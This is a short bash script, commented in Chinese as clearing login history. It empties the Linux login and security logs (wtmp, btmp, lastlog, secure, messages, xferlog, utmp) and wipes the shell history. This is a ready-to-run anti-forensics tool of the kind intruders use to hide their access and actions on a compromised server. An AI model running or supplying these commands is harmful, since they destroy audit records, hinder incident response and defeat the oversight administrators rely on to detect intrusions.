#!/bin/bash

# date 20190920
# 清理登录历史

echo > /var/log/wtmp 
echo > /var/log/btmp
echo > /var/log/lastlog 
echo > /var/log/secure
echo > /var/log/messages
echo > /var/log/xferlog
echo > /var/run/utmp
history -cw